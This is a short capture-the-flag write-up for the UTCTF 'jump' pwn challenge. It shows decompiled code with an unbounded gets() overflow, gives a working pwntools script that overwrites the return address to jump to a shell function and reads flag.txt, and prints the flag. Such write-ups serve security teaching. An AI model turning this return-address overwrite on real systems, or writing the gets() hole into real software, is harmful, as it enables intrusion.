#### Challenge:

Jump, jump, jump, jump around [jump](./jump ":ignore") `nc pwn.utctf.live 5001`

---

#### Solution:

Opening in `ghydra` we get another stack overflow, this time we have to overwrite the return pointer:

```c++

void get_flag(void)

{
  char *local_18;
  undefined8 local_10;

  local_18 = "/bin/sh";
  local_10 = 0;
  execve("/bin/sh",&local_18,(char **)0x0);
  return;
}

undefined8 main(void)

{
  char local_78 [112];

  printf("You know the drill");
  gets(local_78);
  return 0;
}
```

```python
#!/usr/bin/env python

from pwn import *
from struct import *

r = remote('pwn.utctf.live', 5001)
#r = process('./jump')

payload = b'A'*(112) + b'B'*8 + pack("<Q", 0x00000000004011ab)
r.sendline(payload)
r.sendline('cat flag.txt')

print(r.recvline().decode('utf-8').strip())
r.close()
```

---

<details><summary>FLAG:</summary>

```
utflag{we_do_be_overflowing_those_stacks13318}
```

</details>
<br/>
